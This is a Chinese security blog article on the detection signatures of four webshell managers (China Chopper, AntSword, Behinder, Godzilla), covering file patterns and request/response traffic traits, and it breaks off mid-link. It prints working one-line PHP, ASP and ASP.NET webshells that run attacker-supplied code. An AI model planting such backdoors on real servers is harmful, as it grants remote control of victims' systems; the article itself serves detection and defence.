---
title: 常见webshell工具及特征分析
url: https://www.secpulse.com/archives/197128.html
source: 安全脉搏
date: 2023-03-08
fetch_date: 2025-10-04T08:52:33.530140
---

# 常见webshell工具及特征分析

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 常见webshell工具及特征分析

[工具](https://www.secpulse.com/archives/category/tools)

[Lemon](https://www.secpulse.com/newpage/author?author_id=5109)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng3.png)

2023-03-07

13,104

在工作中经常会遇到各种websehll，黑客通常要通过各种方式获取 webshell，从而获得企业网站的控制权，识别出webshell文件或通信流量可以有效地阻止黑客进一步的攻击行为，下面以常见的四款webshell进行分析，对工具连接流量有个基本认识。

## Webshell简介

webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。正因如此，也有小部分人将代码修改后当作后门程序使用，以达到控制网站服务器的目的，也可以将其称做为一种网页后门

最普通的一句话木马：

<?php   @eval($\_POST['shell']);?>

<?php system($\_REQUEST['cmd']);>

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-1678174927.jpeg)

## 中国菜刀

中国菜刀（Chopper）是一款经典的网站管理工具，具有文件管理、数据库管理、虚拟终端等功能。

它的流量特征十分明显，现如今的安全设备基本上都可以识别到菜刀的流量。现在的菜刀基本都是在安全教学中使用。

github项目地址：https://github.com/raddyfiy/caidao-official-version

由于菜刀官方网站已关闭，现存的可能存在后门最好在虚拟机运行，上面项目已经进行了md5对比没有问题。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-1678174928.jpeg)

### 菜刀webshell的静态特征

菜刀使用的webshell为一句话木马，特征十分明显

常见一句话(Eval)：

PHP, ASP, ASP.NET 的网站都可以：

> PHP:    <?php @eval($\_POST['caidao']);?>
>
> ASP:    <%eval request("caidao")%>
>
> ASP.NET:    <%@ Page Language="Jscript"%><%eval(Request.Item["caidao"],"unsafe");%>

### 菜刀webshell的动态特征

请求包中：

ua头为百度爬虫

请求体中存在eavl，base64等特征字符

请求体中传递的payload为base64编码，并且存在固定的QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J

请求体中执行结果响应为明文，格式为X@Y    结果   X@Y之中

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-16781749281.jpeg)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-1678174929.jpeg)

## 蚁剑

AntSword（蚁剑）是一个开放源代码，跨平台的网站管理工具，旨在满足渗透测试人员以及具有权限和/或授权的安全研究人员以及网站管理员的需求。

github项目地址：https://github.com/AntSwordProject/antSword

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-16781749291.jpeg)

### 蚁剑webshell静态特征

https://github.com/AntSwordProject/AwesomeScript蚁剑官方为我们提供了制作好的后门，官方的脚本均做了不同程度“变异”，蚁剑的核心代码是由菜刀修改而来的，所有普通的一句话木马也可以使用。

Php中使用assert，eval执行, asp 使用eval ，在jsp使用的是Java类加载（ClassLoader）,同时会带有base64编码解码等字符特征

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-1678174930.jpeg)

### 蚁剑webshell动态特征

默认编码连接时

这里我们直接使用菜刀的一句话webshell

每个请求体都存在@ini\_set(“display\_errors”, “0”);@set\_time\_limit(0)开头。并且存在base64等字符

响应包的结果返回格式为  随机数 结果  随机数

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-16781749301.jpeg)

使用base64编码器和解码器时

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-1678174931.jpeg)

蚁剑会随机生成一个参数传入base64编码后的代码，密码参数的值是通过POST获取随机参数的值然后进行base64解码后使用eval执行

响应包的结果返回格式为  随机数 编码后的结果  随机数

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-16781749311.jpeg)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-1678174932.jpeg)

## 冰蝎

冰蝎是一款动态二进制加密网站管理客户端。

github地址：https://github.com/rebeyond/Behinder

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-16781749321.jpeg)

冰蝎文件夹中，server 文件中存放了各种类型的木马文件

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-1678174933.jpeg)

### 冰蝎webshell木马静态特征

这里主要分析3.0版本的

采用采用预共享密钥，密钥格式为md5(“admin”)[0:16], 所以在各种语言的webshell中都会存在16位数的连接密码，默认变量为k。

在PHP中会判断是否开启openssl采用不同的加密算法，在代码中同样会存在eval或assert等字符特征

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-16781749331.jpeg)

在aps中会在for循环进行一段异或处理

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-1678174934.jpeg)

在jsp中则利用java的反射，所以会存在ClassLoader，getClass().getClassLoader()等字符特征

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-1678174935.jpeg)

### 冰蝎2.0 webshell木马动态特征

在了解冰蝎3.0之前，先看看2.0是怎么交互等

2.0中采用协商密钥机制。第一阶段请求中返回包状态码为200，返回内容必定是16位的密钥

Accept: text/html, image/gif, image/jpeg, \*; q=.2, \*/\*; q=.2

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-16781749351.jpeg)

建立连接后 所有请求 Cookie的格式都为: Cookie: PHPSESSID=; path=/；

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-1678174936.jpeg)

### 冰蝎3.0 webshell木马动态特征

在3.0中改了，去除了动态密钥协商机制，采用预共享密钥，全程无明文交互，密钥格式为md5(“admin”)[0:16],但还是会存在一些特征

在使用命令执行功能时，请求包中content-length 为5740或5720（可能会根据Java版本而改变）

每一个请求头中存在Pragma: no-cache，Cache-Control: no-cache

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-16781749361.jpeg)

## 哥斯拉

哥斯拉继菜刀、蚁剑、冰蝎之后具有更多优点的Webshell管理工具

github地址：https://github.com/BeichenDream/Godzilla

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-1678174937.jpeg)

哥斯拉的webshell需要动态生成，可以根据需求选择各种不同的加密方式

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-16781749371.jpeg)

### 哥斯拉webshell木马静态特征

选择默认脚本编码生成的情况下，jsp会出现xc,pass字符和Java反射（ClassLoader，getClass().getClassLoader()），base64加解码等特征

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197128-16781749372.jpeg)

php，asp则为普通的一句话木马

![](https://secpulseoss.oss-cn-shanghai...